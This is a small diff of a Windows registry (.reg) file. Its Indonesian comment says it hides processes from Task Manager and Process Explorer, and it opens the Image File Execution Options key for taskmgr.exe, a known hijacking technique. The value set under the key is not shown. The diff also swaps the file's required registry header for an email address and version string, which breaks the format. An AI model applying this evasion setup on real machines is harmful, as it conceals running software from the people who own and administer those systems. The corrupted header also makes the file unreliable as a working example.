@@ -1,4 +1,4 @@
-Windows Registry Editor Version 5.00
+hi@kdandy.com Version 1.0
 
 ; Menyembunyikan proses dari Task Manager dan Process Explorer
 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe]
